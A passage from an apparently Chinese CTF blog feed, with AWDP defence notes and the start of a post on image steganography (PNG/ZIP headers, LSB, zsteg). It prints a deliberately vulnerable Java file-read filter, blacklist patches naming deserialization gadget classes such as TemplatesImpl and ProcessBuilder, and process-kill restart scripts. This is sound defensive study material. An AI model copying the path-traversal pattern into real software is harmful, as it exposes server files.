class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token class-name">ObjectClass</span> <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>targetclass<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> constructor <span class="token operator">=</span> <span class="token class-name">ObjectClass</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Object</span> <span class="token class-name">CLassInstance</span> <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"logout"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Method</span> targetMethod <span class="token operator">=</span> <span class="token class-name">ObjectClass</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">HttpSession</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        targetMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">CLassInstance</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> session <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Method</span> targetMethod2 <span class="token operator">=</span> <span class="token class-name">ObjectClass</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        targetMethod2<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">CLassInstance</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       <span class="token keyword">return</span> <span class="token string">"redirect:/"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token string">"redirect:/"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@WebFilter</span><span class="token punctuation">(</span>urlPatterns <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/*"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> myFilter <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">HttpServletRequest</span> request <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span>servletRequest<span class="token punctuation">;</span>    <span class="token class-name">String</span> request_uri <span class="token operator">=</span> <span class="token class-name">URLDecoder</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Check</span><span class="token punctuation">.</span><span class="token function">check</span><span class="token punctuation">(</span>request_uri<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">booleanValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">String</span> static_resources_path <span class="token operator">=</span> <span class="token string">"/usr/local/tomcat/webapps/app/WEB-INF/classes/static/"</span> <span class="token operator">+</span> request_uri<span class="token punctuation">;</span>      static_resources_path <span class="token operator">=</span> <span class="token class-name">URLDecoder</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>static_resources_path<span class="token punctuation">,</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        servletResponse<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token class-name">File</span><span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>static_resources_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        servletResponse<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"error~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fix：直接对File类下手</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">readFile</span><span class="token punctuation">(</span><span class="token class-name">String</span> filePath<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> blackList <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">".."</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> s <span class="token operator">:</span> blackList<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>filePath<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"hacker"</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token class-name">String</span> file_content <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">int</span> readCount <span class="token operator">=</span> fileInputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>readCount <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>           file_content <span class="token operator">=</span> file_content <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> readCount<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         fileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">FileNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       <span class="token keyword">return</span> file_content<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> th<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      fileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">throw</span> th<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="重写resolveClass"><a href="#重写resolveClass" class="headerlink" title="重写resolveClass"></a>重写resolveClass</h3><p>参考：<a href="https://flowerwind.github.io/2021/05/01/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E9%87%8D%E5%86%99resolveClass%E6%9D%A5%E7%99%BD%E5%90%8D%E5%8D%95%E9%98%B2%E5%BE%A1java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://flowerwind.github.io/2021/05/01/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E9%87%8D%E5%86%99resolveClass%E6%9D%A5%E7%99%BD%E5%90%8D%E5%8D%95%E9%98%B2%E5%BE%A1java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p><p>在将字节码恢复为类的过程中，调用了<code>resolveClass</code>方法，而这个resolveClass方法如果被重写的话，调用的就是重写类的resolvceClass</p><p>我们如果在重写的resolvceClass中写入代码，即可控制需要恢复类的名称</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">ObjectStreamClass</span> desc<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Iterator</span> var2 <span class="token operator">=</span> <span class="token constant">BLACKLIST</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> s<span class="token punctuation">;</span>    <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var2<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        s <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>var2<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidClassException</span><span class="token punctuation">(</span><span class="token string">"Unauthorized deserialization attempt"</span><span class="token punctuation">,</span> desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token punctuation">&#123;</span>    <span class="token constant">BLACKLIST</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"com.sun.jndi"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token constant">BLACKLIST</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"com.fasterxml.jackson"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token constant">BLACKLIST</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"org.springframework"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token constant">BLACKLIST</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token constant">BLACKLIST</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"java.security.SignedObject"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token constant">BLACKLIST</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token constant">BLACKLIST</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token constant">BLACKLIST</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessBuilder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token constant">BLACKLIST</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"java.util.PriorityQueue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"strings"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>filterList <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">&#123;</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">&#125;</span>str <span class="token operator">:=</span> <span class="token string">"ana"</span> <span class="token comment">// 匹配包含"ana"的字符串</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> s <span class="token operator">:=</span> <span class="token keyword">range</span> filterList <span class="token punctuation">&#123;</span><span class="token keyword">if</span> strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Update"><a href="#Update" class="headerlink" title="Update"></a>Update</h1><p>update.sh</p><p>常规php文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> 要替换的文件 /var/www/html/待替换的文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>python：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token function">cp</span> /app.py /app/app.py<span class="token function">ps</span> <span class="token parameter variable">-ef</span> <span class="token operator">|</span> <span class="token function">grep</span> python <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token function">grep</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $2&#125;'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">kill</span> <span class="token parameter variable">-9</span> <span class="token builtin class-name">cd</span> /app <span class="token operator">&amp;&amp;</span> <span class="token function">nohup</span> python app.py  <span class="token operator">>></span> /opt/app.log <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>nodejs：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token function">cp</span> server.js /app/server.js<span class="token function">ps</span> <span class="token parameter variable">-ef</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token function">node</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token function">grep</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $2&#125;'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">kill</span> <span class="token parameter variable">-9</span> <span class="token builtin class-name">cd</span> /app <span class="token operator">&amp;&amp;</span> <span class="token function">nohup</span> <span class="token function">node</span> server.js  <span class="token operator">>></span> /opt/aa.log <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>golang：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> ./修改后编译好的文件 /编译文件的目录<span class="token function">ps</span> <span class="token parameter variable">-ef</span> <span class="token operator">|</span><span class="token function">grep</span> go编译的名字<span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $2&#125;'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">kill</span> <span class="token parameter variable">-9</span><span class="token builtin class-name">cd</span> /编译文件目录 <span class="token operator">&amp;&amp;</span>./执行编译文件 <span class="token operator">></span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>java：</p><p>直接覆盖jar包重启环境</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://fushuling.com/index.php/2023/06/01/awd/&quot;&gt;https://fushuling.com/index.php/2023/06/01/awd/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://5ime.cn/awdp.html#nexmoe-content&quot;&gt;https://5ime.cn/awdp.html#nexmoe-content&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://hackerpoet.com/index.php/archives/988/&quot;&gt;https://hackerpoet.com/index.php/archives/988/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="AWDP" scheme="http://c1oudfl0w0.github.io/blog/categories/AWDP/"/>
    
    
  </entry>
  
  <entry>
    <title>图片隐写</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/18/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/18/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</id>
    <published>2024-06-18T07:31:46.000Z</published>
    <updated>2024-06-18T08:04:57.903Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本着有接触过就稍微记录一下的原则，于是就有了这个</p><span id="more"></span><hr><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><h3 id="png"><a href="#png" class="headerlink" title="png"></a>png</h3><p>参考：<a href="https://www.freebuf.com/articles/others-articles/265879.html">https://www.freebuf.com/articles/others-articles/265879.html</a></p><p>文件头：<code>89 50 4E 47 0D 0A 1A 0A</code></p><h4 id="IHDR"><a href="#IHDR" class="headerlink" title="IHDR"></a>IHDR</h4><blockquote><p>文件头数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</p></blockquote><p>文件头数据块由13字节组成，它的格式如下表所示：</p><table><thead><tr><th><strong>域的名称</strong></th><th><strong>字节数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>Width</td><td>4 bytes</td><td>图像宽度，以像素为单位</td></tr><tr><td>Height</td><td>4 bytes</td><td>图像高度，以像素为单位</td></tr><tr><td>Bit depth</td><td>1 byte</td><td>图像深度： 索引彩色图像：1，2，4或8 灰度图像：1，2，4，8或16 真彩色图像：8或16</td></tr><tr><td>ColorType</td><td>1 byte</td><td>颜色类型： 0：灰度图像, 1，2，4，8或16 2：真彩色图像，8或16 3：索引彩色图像，1，2，4或8 4：带α通道数据的灰度图像，8或16 6：带α通道数据的真彩色图像，8或16</td></tr><tr><td>Compression method</td><td>1 byte</td><td>压缩方法(LZ77派生算法)</td></tr><tr><td>Filter method</td><td>1 byte</td><td>滤波器方法</td></tr><tr><td>Interlace method</td><td>1 byte</td><td>隔行扫描方法： 0：非隔行扫描 1： Adam7(由Adam M. Costello开发的7遍隔行扫描方法)</td></tr></tbody></table><p>IHDR（49 48 44 52）数据块关键字之后紧接的就是定义宽与高的字节块，具体可以先看图片属性中的宽高然后转为16进制后再搜索发现对应的字节块（同样也适用于jpg）</p><hr><h3 id="jpg"><a href="#jpg" class="headerlink" title="jpg"></a>jpg</h3><hr><h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><p>参考：<a href="https://goodapple.top/archives/700">https://goodapple.top/archives/700</a></p><p>实体文件头：包含着文件的各种信息，包括文件名称、解压缩版本、压缩方式、CRC等等，固定值<code>50 4B 03 04</code></p><hr><h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><blockquote><p>LSB替换写基本思路是用嵌入的秘密信息取代载体图像的最低比特位，原来的7个高位平面与替代秘密信息的最低为平面组合成含隐藏信息的新图形。</p></blockquote><ol><li>像素三原色（RGB）</li><li>通过修改像素中最低位的1bit来达到隐藏的效果。</li><li>工具：stegsolve、zsteg、python脚本</li></ol><hr><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="zsteg"><a href="#zsteg" class="headerlink" title="zsteg"></a>zsteg</h2><p>参考：<a href="https://blog.csdn.net/Amherstieae/article/details/107512398">https://blog.csdn.net/Amherstieae/article/details/107512398</a></p><blockquote><p>可以检测并提取出PNG和BMP图片里的隐写数据</p></blockquote><p>github：<a href="https://github.com/zed-0xff/zsteg">https://github.com/zed-0xff/zsteg</a></p><p>安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gem <span class="token function">install</span> zsteg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看lsb数据：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zsteg xxx.bmpzsteg xxx.pngzsteg <span class="token parameter variable">-a</span> <span class="token punctuation">(</span>文件名<span class="token punctuation">)</span>    <span class="token comment">#查看各个通道的lsb</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/06/18/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/image-20240618153734927.png" alt="image-20240618153734927"></p><p>检测zlib：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#-b的位数是从1开始的</span>zsteg zlib.bmp <span class="token parameter variable">-b</span> <span class="token number">1</span> <span class="token parameter variable">-o</span> xy <span class="token parameter variable">-v</span><span aria-hidden="true" 